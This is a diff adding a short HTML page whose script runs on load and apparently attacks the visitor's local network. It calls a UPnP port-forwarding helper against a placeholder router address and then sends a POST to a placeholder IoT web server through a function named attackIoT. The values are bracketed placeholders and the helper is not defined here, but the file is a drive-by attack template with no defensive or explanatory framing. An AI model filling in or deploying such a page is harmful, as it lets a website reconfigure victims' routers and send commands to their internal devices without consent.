@@ -1,0 +1,28 @@
+<html>
+<head>
+</head>
+<body>
+<script type="text/javascript">
+
+
+addPortForwardingRuleWithUpnp("http://[ROUTER_INTERNAL_IP]:[ROUTER_UPNP_PORT]", "http://[ROUTER_INTERNAL_IP]:[ROUTER_UPNP_PORT]/[UPNP_COMMAND_PATH]", "[EXT_PORT]", "[INT_PORT]", "[INT_HOST]")
+	
+	function attackIoT(IoTServerURL, data) {
+		
+
+		var xhr = new XMLHttpRequest();
+		xhr.open('POST', IoTServerURL, true);
+			
+		// Send the POST request
+		xhr.send(data);
+	}
+
+	function IoT() {
+	attackIoT("http://[IOT_WEBSERVER_URL]", "[DATA]")
+	}
+	
+	IoT()
+	
+</script>
+</body>
+</html>
